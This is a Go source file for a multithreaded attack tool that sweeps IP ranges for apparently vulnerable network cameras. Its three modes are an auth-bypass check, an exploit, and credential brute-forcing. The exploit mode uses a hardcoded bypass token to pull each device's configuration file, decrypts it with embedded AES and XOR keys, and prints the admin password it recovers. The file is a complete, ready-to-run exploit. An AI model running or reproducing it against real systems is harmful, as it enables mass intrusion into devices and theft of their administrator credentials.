package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gookit/color"
	"github.com/msterzhang/gpool"
)

var max int

type Flag struct {
	Ips      string // ip列表
	Ssl      string // 协议
	File     string // 文件
	Attack   bool   // POC
	Bomb     bool
	Exp      bool
	Username string
	Password string
	Threads  int
}

func Init() *Flag {
	portscan_flag := Flag{}
	flag.StringVar(&portscan_flag.Ips, "i", "", "输入ip地址 eg:192.0.0.1-192.0.0.255")
	flag.StringVar(&portscan_flag.Ssl, "s", "http", "协议 eg:http")
	flag.IntVar(&portscan_flag.Threads, "t", 50, "线程数量 默认50")
	flag.StringVar(&portscan_flag.File, "f", "", "文件名称 默认为空")
	flag.BoolVar(&portscan_flag.Attack, "a", false, "加载Poc模块")
	flag.BoolVar(&portscan_flag.Exp, "e", false, "加载Exp模块")
	flag.BoolVar(&portscan_flag.Bomb, "b", false, "加载密码爆破模块")
	flag.StringVar(&portscan_flag.Username, "u", "admin", "用户名 default:admin")
	flag.StringVar(&portscan_flag.Password, "p", "12345", "密码 default:12345")
	return &portscan_flag
}

func StringIpToInt(ipstring string) int {
	ipSegs := strings.Split(ipstring, ".")
	var ipInt int = 0
	var pos uint = 24
	for _, ipSeg := range ipSegs {
		tempInt, _ := strconv.Atoi(ipSeg)
		tempInt = tempInt << pos
		ipInt = ipInt | tempInt
		pos -= 8
	}
	return ipInt
}

func IpIntToString(ipInt int) string {
	ipSegs := make([]string, 4)
	var len int = len(ipSegs)
	buffer := bytes.NewBufferString("")
	for i := 0; i < len; i++ {
		tempInt := ipInt & 0xFF
		ipSegs[len-i-1] = strconv.Itoa(tempInt)
		ipInt = ipInt >> 8
	}
	for i := 0; i < len; i++ {
		buffer.WriteString(ipSegs[i])
		if i < len-1 {
			buffer.WriteString(".")
		}
	}
	return buffer.String()
}

func checkips(ipstr string) (int, int) {
	ips_arr := strings.Split(ipstr, "-")
	if len(ips_arr) < 2 {
		return StringIpToInt(ips_arr[0]), StringIpToInt(ips_arr[0])
	}
	return StringIpToInt(ips_arr[0]), StringIpToInt(ips_arr[1])
}

// ZeroPadding pads byte array to block size with zero
func ZeroPadding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{0}, padding)
	return append(data, padText...)
}

// ZeroUnPadding removes zero padding
func ZeroUnPadding(data []byte) ([]byte, error) {
	padding := 0
	length := len(data)
	if length == 0 {
		return nil, errors.New("cannot remove padding for zero length byte array")
	}
	for i := length - 1; i >= 0; i-- {
		// byte is same to int8, stands for ascii code
		if data[i] == 0 {
			padding++
		} else {
			break
		}
	}
	return data[:length-padding], nil
}

func AesDecrypt(cipherText []byte, key []byte) []byte {
	// create an AES instance
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()
	cipherText = ZeroPadding(cipherText, blockSize)
	plainByte := make([]byte, len(cipherText))
	for bs, be := 0, blockSize; bs < len(cipherText); bs, be = bs+blockSize, be+blockSize {
		block.Decrypt(plainByte[bs:be], cipherText[bs:be])
	}

	plainByte, _ = ZeroUnPadding(plainByte)
	return plainByte
}

func xore(data []byte, key []byte) []byte {
	var result []byte
	for i := 0; i < len(data); i++ {
		result = append(result, data[i]^key[i%len(key)])
	}
	return result
}

func FilterStrings(data string) []string {
	printableChars := `A-Za-z0-9/\-:.,_$%'()[\]<> `
	shortestReturnChar := 2
	regExp := fmt.Sprintf("[%s]{%d,}", printableChars, shortestReturnChar)
	pattern := regexp.MustCompile(regExp)
	return pattern.FindAllString(data, -1)
}

func exp(ipstr int, ssl string, pool *gpool.Pool) int {
	var password string = ""
	client := &http.Client{Timeout: time.Duration(5 * time.Second)}
	req, err := http.NewRequest("GET", ssl+"://"+IpIntToString(ipstr)+"/System/configurationFile?auth=YWRtaW46MTEK", nil)
	if err != nil {
		pool.Done()
		return 0
	}
	resp, err := client.Do(req)
	if err != nil {
		pool.Done()
		return 0
	}

	if resp.StatusCode == 200 {
		key, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
		content, _ := ioutil.ReadAll(resp.Body)
		xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
		decrypted := AesDecrypt(content, key)
		resultList := FilterStrings(string(xore(decrypted, xorKey)))
		for i, v := range resultList {
			if v == "admin" {
				password = resultList[i+1]
			}
		}
		color.Red.Println("[Vul] verify " + IpIntToString(ipstr) + ",password:" + password)
		pool.Done()
		return 1
	}
	pool.Done()
	return 0
}
func poc(ipstr int, ssl string, pool *gpool.Pool) int {
	client := &http.Client{Timeout: time.Duration(5 * time.Second)}
	req, err := http.NewRequest("GET", ssl+"://"+IpIntToString(ipstr)+"/Security/users?auth=YWRtaW46MTEK", nil)
	if err != nil {
		pool.Done()
		return 0
	}
	resp, err := client.Do(req)
	if err != nil {
		pool.Done()
		return 0
	}
	if resp.StatusCode == 200 {
		color.Red.Println("[Vul] verify " + IpIntToString(ipstr))
		pool.Done()
		return 1
	}
	pool.Done()
	return 0
}

func bomb(ipstr int, ssl string, username string, password string, pool *gpool.Pool) int {
	client := &http.Client{Timeout: time.Duration(5 * time.Second)}
	req, err := http.NewRequest("GET", ssl+"://"+IpIntToString(ipstr)+"/PSIA/System/deviceinfo", nil)
	if err != nil {
		pool.Done()
		return 0
	}
	req.SetBasicAuth(username, password)
	resp, err := client.Do(req)
	if err != nil {
		pool.Done()
		return 0
	}
	//resp, err := http.Get("http://" + IpIntToString(ipstr) + "/PSIA/System/deviceinfo"
	if resp.StatusCode == 200 {
		color.Red.Println("[Vul] verify " + IpIntToString(ipstr))
		pool.Done()
		return 1
	}
	pool.Done()
	return 0
}

func main() {
	portscan_flag := &Flag{}
	portscan_flag = Init()
	flag.Parse()
	if portscan_flag.Ips == "" && portscan_flag.File == "" {
		color.Red.Println("[Error]输入文件或者ip地址")
		return
	}
	pool := gpool.New(portscan_flag.Threads)
	if portscan_flag.Ips != "" && portscan_flag.File == "" {
		startip, endip := checkips(string(portscan_flag.Ips))
		color.Green.Println("[Load]加载线程数量" + strconv.Itoa(portscan_flag.Threads))
		if portscan_flag.Attack {
			for i := startip; i <= endip; i++ {
				pool.Add(1)
				go poc(i, portscan_flag.Ssl, pool)
			}
			pool.Wait()
		}
		if portscan_flag.Exp {
			for i := startip; i <= endip; i++ {
				pool.Add(1)
				go exp(i, portscan_flag.Ssl, pool)
			}
			pool.Wait()
		}
		if portscan_flag.Bomb {
			for i := startip; i <= endip; i++ {
				pool.Add(1)
				go bomb(i, portscan_flag.Ssl, portscan_flag.Username, portscan_flag.Password, pool)
			}
			pool.Wait()
		}
	} else {
		color.Green.Println("[Load]加载线程数量" + strconv.Itoa(portscan_flag.Threads))
		fi, err := os.Open(portscan_flag.File)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			return
		}
		defer fi.Close()
		br := bufio.NewReader(fi)
		for {
			ip, _, err := br.ReadLine()
			if err == io.EOF {
				break
			}
			startip, endip := checkips(string(ip))
			if portscan_flag.Attack {
				for i := startip; i <= endip; i++ {
					pool.Add(1)
					go poc(i, portscan_flag.Ssl, pool)
				}
				pool.Wait()
			}
			if portscan_flag.Exp {
				for i := startip; i <= endip; i++ {
					pool.Add(1)
					go exp(i, portscan_flag.Ssl, pool)
				}
				pool.Wait()
			}
			if portscan_flag.Bomb {
				for i := startip; i <= endip; i++ {
					pool.Add(1)
					go bomb(i, portscan_flag.Ssl, portscan_flag.Username, portscan_flag.Password, pool)
				}
				pool.Wait()
			}

		}
	}
	color.Green.Println("[Success]Attack down")
}
